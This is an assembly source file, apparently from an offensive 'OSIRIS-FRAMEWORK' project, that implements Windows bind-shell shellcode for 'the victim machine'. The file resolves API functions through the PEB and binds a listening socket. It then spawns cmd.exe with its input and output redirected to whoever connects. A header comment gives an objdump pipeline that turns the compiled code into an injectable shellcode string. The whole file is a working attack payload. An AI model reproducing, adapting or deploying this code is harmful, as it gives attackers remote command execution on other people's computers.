;Template: lifting a port on the victim machine using the PEB method
;Author: Samir sanchez garnica
;@sasaga92
;compile: using fasm (nasm file.asm)
;extract opcodes: objdump -d ./file.exe|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
;project: OSIRIS-FRAMEWORK

format PE console
use32
_start:
   xor eax,eax
   push eax ; null terminator for createProcA
   mov eax,[fs:eax+0x30] ; Proccess Enviroment Block
   mov eax,[eax+0xc]
   mov esi,[eax+0x14]
   lodsd
   xchg esi,eax
   lodsd
   mov ebx,[eax+0x10] ; kernel32
   mov ecx,[ebx+0x3c] ; DOS->elf_anew
   add ecx, ebx; Skip to PE start
   mov ecx, [ecx+0x78] ; offset to export table
   add ecx,ebx ; kernel32 image_export_dir
   mov esi,[ecx+0x20] ; Name Pointer Table
   add esi,ebx
   xor edx,edx
   getProcAddress:
       inc edx
       lodsd
       add eax,ebx
       cmp dword [eax],0x50746547
       jnz getProcAddress
       mov edi,0x41636f72
       cmp dword [eax+4], edi
       jnz getProcAddress
       mov esi,[ecx+0x1c] ; Functions Addresses Chain
       add esi,ebx
       sub edx, 1
       mov edx,[esi+edx*4]
       add edx,ebx ; GetProcAddress
       sub esp, 32 ; Buffer for the function addresses chain
       push esp
       pop esi
       mov [esp],edx ; esi offset 0 -> GetProcAddress
       mov [esi+28],ebx ;esi offset 28 -> kernel32
       ;--------Call LoadLibraryA--------------
       xor edi,edi
       push edi
       push 0x41797261 ; Ayra
       push 0x7262694c ; rbiL
       push 0x64616f4c ; daoL
       push esp
       push ebx
       call dword [esi]
       ;-----ws2_32.dll Address-------
       xor ecx,ecx
       push ecx
       mov cx, 0x3233   ; 0023
       push ecx
       push 0x5f327377  ; _2sw
       push esp
       call eax
       mov ebp,eax ;ebp = ws2_32.dll
       ;-------WSAstartup Address-------------
       xor ecx,ecx
       push ecx
       mov cx, 0x7075      ; 00up
       push ecx
       push 0x74726174     ; trat
       push 0x53415357     ; SASW
       push esp
       push ebp
       call dword [esi]
       mov [esi+12],eax ;esi offset 12 -> WSAstartup
       ;-------WSASocketA Address-------------
       xor ecx,ecx
       push ecx
       mov cx, 0x4174 ; 00At
       push ecx
       push 0x656b636f ; ekco
       push 0x53415357 ; SASW
       push esp
       push ebp
       call dword [esi]
       mov [esi+16],eax;esi offset 16 -> WSASocketA
       ;------function bind(); -------------
       push edi
       push 0x646e6962 ;dnib
       push esp
       push ebp
       call dword [esi]
       mov [esi+20],eax;esi offset 20 -> bind();
       ;------function listen(); -------------
       xor ecx, ecx
       mov cx,0x6e65 ; ne
       push ecx
       push 0x7473696c ;tsil
       push esp
       push ebp
       call dword [esi]
       mov [esi+24],eax;esi offset 24 -> listen();
       ;------function accept(); -------------
       xor ecx, ecx
       mov cx,0x7470 ; tp
       push ecx
       push 0x65636361 ;ecca
       push esp
       push ebp
       call dword [esi]
       mov [esi+32],eax;esi offset 32 -> accept();
find_createProcessA:
    ;------find CreateProcessA-------------
        xor ecx, ecx
        push ecx
        mov cx, 0x4173 ; As
        push ecx
        push 0x7365636f ; seco
        push 0x72506574 ; rPet
        push 0x61657243 ; aerC
        push esp
        push ebx
        call dword [esi]
        mov [esi+36],eax;esi offset 36 -> CreateProcessA
find_ExitProcess:
    ;------find ExitProcessA-------------
        push edi
        mov ecx, 0x61737365 ; ssea
        push ecx
        sub dword [esp + 0x3],0x61
        push 0x636f7250 ; corP
        push 0x74697845 ; tixE
        push esp
        push ebx
        call dword [esi]
        mov [esi+40],eax;esi offset 40 -> ExitProcess
;------call WSAstartup()----------
xor ecx,ecx
sub sp,700
push esp
mov cx,514
push ecx
call dword [esi+12]
;--------call WSASocket()-----------
; WSASocket(AF_INET = 2, SOCK_STREAM = 1,
; IPPROTO_TCP = 6, NULL,
;(unsigned int)NULL, (unsigned int)NULL);
xor eax, eax
push eax ; if successful, eax = 0
push eax
push eax
mov al,6
push eax
mov al,1
push eax
inc eax
push eax
call dword [esi+16]
xchg eax, edi   ; edi = SocketRefernce
;------call bind()----------
xor ebx, ebx ;Zero ebx.
push eax ;Push zero.
push eax ;Push zero.
push eax ;Push the sin addr attribute of struct sockaddr in.
mov eax,0xf0d8fefd;Set the high order bytes of eax to the port that is to be bound to and the low order bytes to AF INET.
xor eax, 0xffffffff
dec ah ;Fix the sin family attribute such that it is set appropriately.
push eax ;Push the sin port and sin family attributes.
mov eax, esp ;Set eax to the pointer to the initialized struct sockaddr in structure.
mov bl, 0x10 ;Set the low order byte of ebx to 0x10 to signify the size of the structure.
push ebx ;Push the namelen argument as 0x10.
push eax ;Push the name argument as the pointer to the struct sockaddr in structure.
push edi ;Push the file descriptor that was returned from WSASocket
call dword [esi+20] ;Call bind to bind to the selected port.
;------call listening()----------
push ebx ;Push 0x10 for use as the backlog argument to listen.
push edi ;Push the file descriptor that was returned from WSASocket.
call dword [esi+24] ;Call listen to begin listening on the port that was just bound to.
;------call accept()----------
push ebx ;Push 0x10 onto the stack.
mov edx, esp ;Save the pointer to 0x10 in edx.
sub esp, ebx ;Allocate 16 bytes of stack space for use as the output addr to the accept call.
mov ecx, esp ;Save the pointer to the output buffer in ecx.
push edx ;Push the addrlen argument as the pointer to the 0x10 on the stack.
push ecx ;Push text addr argument as the pointer to the output struct sockaddr in on the stack
push edi ;Push the file descriptor that was returned by WSASocket.
call dword [esi+32] ;Call accept and wait for a client connection to arrive. The client connection will be used for the redirected output from the command interpreter.
mov [esi+44],eax;esi offset 44 -> Save the client file descriptor
executeshell:
    mov eax,0x646d6301  ; mov "cmd01" to eax
    sar eax,0x08        ; shift right 8 bits to get NULL at end of cmd
    push eax        ; push cmd on stack
    mov ebx,esp ; save pointer to cmd in ebp+0x20
    xor ecx,ecx     ; zero out ecx
    mov cl,0x54     ; set the low order of bytes to 0x54 which is going to represent the size of STARTUPINFO and PROCESSINFO on stack
    sub esp,ecx     ; allocate space for structs on stack
    mov edi,esp     ; set edi to point to STARTUPINFO struct
    push edi        ; save edi on stack
    xor eax,eax     ; zero out eax for use with stosb to zeroout the 2 structs
    rep stosb       ; repeat moving eax byte by byte starting by addr pointed to by edi until ecx = 0x54 is zero
    pop edi         ; restore original value of edi pointer to STARTUPINFO Struct
    mov BYTE  [edi],0x44    ; sets the cb attribute to 0x44 the size of the structure
    inc BYTE  [edi+0x2d]    ; set dwflags STARTF_USESTDHANDLES flag to indicate that the hStdInput,hStdOutput,hStdError attributes should be used
    push edi        ; save edi on stack
    mov eax,[esi+44]     ; set eax to the client file descriptor
    lea edi, [edi+0x38] ; load the addr of hStdInput attribute
    stosd           ; store dwrod at eax to addr pointed to by edi hStdinput  eax  = client file descriptor and increment edi
    stosd           ; store dword at eax to addr pointed to by edi hStdOutput
    stosd           ; store dword at eax to addr pointed to by edi hStdError
    pop edi         ; restore edi to original value which is pointer to STARTUPINFO struct
    lea ecx,[edi+0x44] ; load the effective address of struct PROCESS INFORMATION to esi we got that because the cb attribute in the startupinformation attribute show the size of the struct createprocess
    xor eax,eax     ; zero out eax
    push ecx        ; push the pointer to the PROCESSINFORMATION struct to lpProcessInformation attribute
    push edi        ; push the pointer to the STARTUPINFORMATION struct to lpStartupinfo attribute
    push eax        ; set lpstartupdirectory to NULL
    push eax        ; set the lpEnviroment to NULL
    ;push 0x08000000        ; set the dwcreationflag to CREATE_NO_WINDOW
    push eax        ; set the dwcreationflag to 0
    inc eax         ; eax = 1
    push eax        ; set bInheritHandles argument to TRUE since client need to inherit the socket file descriptor
    dec eax         ; eax = 0
    push eax        ; set lpthreadAttributes argument as NULL
    push eax        ; set lpProcessAttributes argument as NULL
    push ebx        ; set the lpcommandline argument to cmd saved at [ebp+0x2c]
    push eax        ; set lpApplicationName argument to NULL
    call dword [esi+36]
    ExitProcess:
        call dword [esi+40]
